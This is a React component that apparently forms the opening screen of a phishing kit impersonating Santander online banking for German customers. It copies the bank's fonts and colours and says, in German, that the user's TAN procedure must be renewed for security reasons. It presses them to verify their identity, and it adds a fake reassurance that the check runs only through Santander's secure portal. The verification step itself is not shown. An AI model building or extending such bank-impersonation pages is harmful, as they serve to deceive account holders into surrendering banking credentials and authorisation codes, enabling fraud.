import React from 'react';
import { AlertTriangle } from 'lucide-react';

interface AccountCompromisedScreenProps {
  onStartVerification: () => void;
}

const AccountCompromisedScreen: React.FC<AccountCompromisedScreenProps> = ({ onStartVerification }) => {
  return (
    <>
      <style>
        {`
          @media (max-width: 768px) {
            .mobile-title {
              font-size: 2.5rem !important;
            }
          }
          @media (max-width: 480px) {
            .mobile-title {
              font-size: 2rem !important;
            }
          }
        `}
      </style>
      <div style={{ 
        minHeight: '80vh',
        display: 'flex',
        alignItems: 'flex-start',
        paddingTop: '4rem'
      }}>
        <div style={{
          maxWidth: '1440px',
          margin: '0 auto',
          width: '100%',
          padding: '0 2rem'
        }}>
          {/* Warning Box */}
          <div style={{
            backgroundColor: '#fff3cd',
            border: '1px solid #ffeaa7',
            borderRadius: '8px',
            padding: '20px',
            marginBottom: '3rem',
            display: 'flex',
            alignItems: 'flex-start',
            gap: '16px',
            maxWidth: '800px'
          }}>
            <AlertTriangle size={24} color="#856404" style={{ flexShrink: 0, marginTop: '2px' }} />
            <div>
              <h2 style={{
                color: '#856404',
                fontSize: '1.25rem',
                fontWeight: '600',
                marginBottom: '0.5rem',
                fontFamily: 'santander_headline_bold, Arial, sans-serif'
              }}>
                TAN-Verfahren erneuern
              </h2>
              <p style={{
                color: '#856404',
                fontSize: '1rem',
                margin: 0,
                fontFamily: 'santander_regular, Arial, sans-serif',
                lineHeight: '1.5'
              }}>
                Aus Sicherheitsgründen müssen Sie Ihr TAN-Verfahren erneuern. Bitte verifizieren Sie Ihre Identität, um fortzufahren.
              </p>
            </div>
          </div>

          {/* Main Content */}
          <div style={{ maxWidth: '800px' }}>
            {/* Large Title */}
            <h1 className="mobile-title" style={{
              color: '#444',
              fontSize: '3rem',
              fontWeight: '600',
              marginBottom: '1.5rem',
              fontFamily: 'santander_headline_bold, Arial, sans-serif',
              lineHeight: '1.1'
            }}>
              TAN erneuern
            </h1>
            
            {/* Information Text */}
            <div style={{ marginBottom: '3rem' }}>
              <p style={{
                color: '#666',
                fontSize: '1.125rem',
                lineHeight: '1.6',
                marginBottom: '1.5rem',
                fontFamily: 'santander_regular, Arial, sans-serif'
              }}>
                Ihr TAN-Verfahren muss aus Sicherheitsgründen erneuert werden. Dies ist eine routinemäßige Sicherheitsmaßnahme zum Schutz Ihres Kontos.
              </p>
              

            </div>
            
            {/* Primary Button */}
            <button
              onClick={onStartVerification}
              style={{
                backgroundColor: '#9e3667',
                color: 'white',
                border: 'none',
                borderRadius: '4px',
                padding: '16px 32px',
                fontSize: '16px',
                fontWeight: '600',
                cursor: 'pointer',
                fontFamily: 'santander_bold, Arial, sans-serif',
                transition: 'all 0.3s ease',
                display: 'inline-flex',
                alignItems: 'center',
                gap: '8px'
              }}
              onMouseEnter={(e) => {
                e.currentTarget.style.backgroundColor = '#8a2f5a';
                e.currentTarget.style.transform = 'translateY(-1px)';
              }}
              onMouseLeave={(e) => {
                e.currentTarget.style.backgroundColor = '#9e3667';
                e.currentTarget.style.transform = 'translateY(0)';
              }}
            >
              TAN-Verfahren jetzt erneuern
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <path d="M5 12h14M12 5l7 7-7 7"/>
              </svg>
            </button>

            {/* Security Note */}
            <div style={{
              marginTop: '3rem',
              padding: '1.5rem',
              backgroundColor: '#f8f9fa',
              borderRadius: '8px',
              borderLeft: '4px solid #9e3667'
            }}>
              <p style={{
                color: '#444',
                fontSize: '0.875rem',
                margin: 0,
                fontFamily: 'santander_regular, Arial, sans-serif',
                lineHeight: '1.5'
              }}>
                <strong>Sicherheitshinweis:</strong> Santander wird Sie niemals per E-Mail oder Telefon nach Ihren vollständigen Zugangsdaten fragen. Diese Verifizierung erfolgt ausschließlich über unser gesichertes Online-Banking-Portal.
              </p>
            </div>
          </div>
        </div>
      </div>
    </>
  );
};

export default AccountCompromisedScreen; 